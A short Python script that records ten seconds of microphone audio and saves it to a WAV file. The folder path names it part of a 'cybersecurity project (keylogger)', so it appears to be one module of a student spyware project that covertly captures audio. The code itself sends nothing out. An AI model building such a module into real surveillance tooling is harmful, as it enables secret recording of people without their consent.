from scipy.io.wavfile import write
import sounddevice  as sd


microphone_time=10
audio_information="audio.wav"

file_path= "D:\\CYBERSECURITY PROJECT(KEYLOGGER)\\project"

extend="\\" 

def audo_record():
    fs= 44100
    seconds=microphone_time

    myrecording= sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    
    write(file_path +extend+audio_information, fs, myrecording)

audo_record()